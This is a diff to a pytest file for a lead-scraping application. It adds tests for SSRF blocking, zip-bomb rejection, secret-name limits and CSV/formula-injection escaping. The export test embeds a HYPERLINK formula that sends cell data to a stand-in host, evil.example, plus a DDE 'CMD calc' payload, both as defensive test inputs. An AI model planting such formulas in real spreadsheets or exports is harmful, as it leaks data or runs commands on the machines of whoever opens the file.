@@ -22,7 +22,7 @@ from leadscraper.db.engine import open_database  # noqa: E402
 from leadscraper.db.models import Organization, Run, Schedule  # noqa: E402
 from leadscraper.db.runs import finish_run, record_failure, start_run  # noqa: E402
 from leadscraper.db.store import LeadStore  # noqa: E402
-from leadscraper.paths import PROJECT_ROOT, default_db_url  # noqa: E402
+from leadscraper.paths import PROJECT_ROOT  # noqa: E402
 from leadscraper.services import (  # noqa: E402
     bundle, catalog, configs, exports, notifications, organizations, projects, retention, runs,
     schedules, settings, suppression,
@@ -35,7 +35,9 @@ UTC = timezone.utc
 
 @pytest.fixture
 def engine():
-    engine = open_database(default_db_url())
+    from app_db import fresh_application_db
+
+    engine = fresh_application_db()
     yield engine
     engine.dispose()
 
@@ -241,7 +243,7 @@ def test_notifications_go_to_subscribed_targets_and_never_raise(engine, ws, monk
     class Response:
         status_code = 200
 
-    def post(url, json=None, timeout=None):
+    def post(url, json=None, timeout=None, allow_redirects=True):
         sent.append((url, json))
         if "broken" in url:
             raise ConnectionError("refused")
@@ -250,6 +252,10 @@ def test_notifications_go_to_subscribed_targets_and_never_raise(engine, ws, monk
     import requests
 
     monkeypatch.setattr(requests, "post", post)
+    # Name resolution varies by network (some resolvers answer anything); the
+    # host guard is tested on literal addresses below.
+    real_check = notifications.check_host
+    monkeypatch.setattr(notifications, "check_host", lambda host: None)
     hook = notifications.create_target(engine, ws, name="Sales", kind="webhook",
                                        config={"url": "https://hooks.example/abc"})
     assert hook["config"]["url"] == "https://hooks.example/***"       # masked
@@ -262,6 +268,18 @@ def test_notifications_go_to_subscribed_targets_and_never_raise(engine, ws, monk
     with pytest.raises(Invalid):
         notifications.create_target(engine, ws, name="Mail", kind="email",
                                     config={"host": "smtp.example.com"})
+    with pytest.raises(Invalid):                     # only notify-* secrets can be referenced
+        notifications.create_target(engine, ws, name="Mail", kind="email", config={
+            "host": "smtp.example.com", "from": "a@example.com", "to": ["b@example.com"],
+            "password_secret_name": "db-password"})
+    # Loopback / private destinations are refused at send time (SSRF).
+    with pytest.raises(RuntimeError, match="private address"):
+        real_check("127.0.0.1")
+    with pytest.raises(RuntimeError, match="private address"):
+        real_check("169.254.169.254")
+    monkeypatch.setenv(notifications.PRIVATE_ENV, "1")
+    real_check("127.0.0.1")
+    monkeypatch.delenv(notifications.PRIVATE_ENV)
 
     completed = seeded_run(engine, ws, leads=[lead("Smile Dental", "+919820012345")])
     results = notifications.notify_run(engine, completed)
@@ -316,9 +334,13 @@ def test_retention_purges_old_events_urls_and_organisations(engine, ws):
         conn.execute(RunEvent.__table__.insert().values(
             workspace_id=ws.id, run_id=run_id, seq=1, type="activity", payload={},
             created_at=long_ago))
-        conn.execute(update(Run.__table__).values(finished_at=long_ago))
+        conn.execute(update(Run.__table__).values(finished_at=long_ago, created_at=long_ago))
         conn.execute(update(Organization.__table__).where(
             Organization.__table__.c.name == "Old Dental").values(updated_at=long_ago))
+    # Found again by a recent run with nothing to add: still "seen", so kept.
+    seeded_run(engine, ws, leads=[lead("New Dental", "+919820054321")])
+    with engine.begin() as conn:
+        conn.execute(update(Organization.__table__).values(updated_at=long_ago))
     dry = retention.purge(engine, ws, dry_run=True)
     assert (dry["events"], dry["organizations"]) == (1, {"Pune dentists": 1})
     done = retention.purge(engine, ws)
@@ -393,9 +415,10 @@ def test_bundle_round_trip_into_a_fresh_database(engine, ws, tmp_path, monkeypat
     assert b"sk-secret" not in everything and b"SECRET-TOKEN" not in everything
     assert "presets/nashik-venues.yaml" in names
 
-    # Another machine: a fresh data directory and database.
+    # Another machine: a fresh data directory and its own SQLite database (with
+    # the Postgres test mode on, this is also a Postgres -> SQLite round trip).
     monkeypatch.setenv("LEADSCRAPER_DATA_DIR", str(tmp_path / "other"))
-    other = open_database(default_db_url())
+    other = open_database(f"sqlite:///{(tmp_path / 'other.sqlite3').as_posix()}")
     try:
         other_ws = default_workspace(other)
         report = bundle.import_bundle(other, other_ws, data)
@@ -415,8 +438,9 @@ def test_bundle_round_trip_into_a_fresh_database(engine, ws, tmp_path, monkeypat
         assert schedule["enabled"] is False                          # never starts on its own
         assert notifications.list_targets(other, other_ws).total == 0
         # Idempotent: a second import adds nothing new and merges the leads.
-        again = bundle.import_bundle(other, other_ws, data, history=False)
+        again = bundle.import_bundle(other, other_ws, data)
         assert again["saved_configs"]["skipped"] == 2
+        assert again["runs"] == 0 and again["runs_skipped"] == 1     # no duplicate history
         assert again["organizations"]["pune-dentists"]["unchanged"] == 2
         assert organizations.list_organizations(other, other_ws,
                                                 project_id=project["id"]).total == 2
@@ -440,6 +464,11 @@ def test_bundles_from_a_newer_version_are_refused(engine, ws):
             bundle.import_bundle(engine, ws, buffer.getvalue())
     with pytest.raises(Invalid, match="not a zip"):
         bundle.import_bundle(engine, ws, b"plain text")
+    bomb = io.BytesIO()
+    with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("manifest.json", b"\0" * (20 * 1024 * 1024))   # 20 MB of zeros
+    with pytest.raises(Invalid, match="would unpack"):
+        bundle.import_bundle(engine, ws, bomb.getvalue())
 
 
 # --- membership and diff --------------------------------------------------------------------------
@@ -461,3 +490,24 @@ def test_refinds_are_run_members_and_the_diff_classifies_them(engine, ws):
     assert [i["change"] for i in diff["items"]] == ["new", "updated", "unchanged"]
     reverse = runs.diff_runs(engine, ws, first, against=second)
     assert reverse["counts"]["only_in_against"] == 1
+
+
+def test_exports_never_carry_live_formulas(engine, ws):
+    """Scraped text starting with = + - @ must not run in Excel / Sheets (CSV injection)."""
+    from openpyxl import load_workbook
+
+    evil = '=HYPERLINK("http://evil.example/?"&A2,"x")'
+    run_id = seeded_run(engine, ws, leads=[
+        Lead(business_name=evil, locality="Baner", category="Dentists",
+             phones=["+919820012345"], address="@SUM(1+1)", sources=["google_maps"])])
+    csv_text = exports.export(engine, ws, "csv", run_id=run_id)[1].decode("utf-8-sig")
+    assert "'" + evil.replace('"', '""') in csv_text and "'@SUM(1+1)" in csv_text
+    assert "+91 98200 12345" in csv_text and "'+91" not in csv_text   # phones untouched
+    book = load_workbook(io.BytesIO(exports.export(engine, ws, "xlsx", run_id=run_id)[1]))
+    sheet = book["Records"]
+    headers = [c.value for c in sheet[1]]
+    name = sheet.cell(2, headers.index("Business Name") + 1)
+    assert name.data_type == "s" and name.value == evil
+    assert exports.safe_cell("+91 98200 12345") == "+91 98200 12345"
+    assert exports.safe_cell("-3.5") == "-3.5"
+    assert exports.safe_cell("+CMD|' /C calc'!A0").startswith("'")
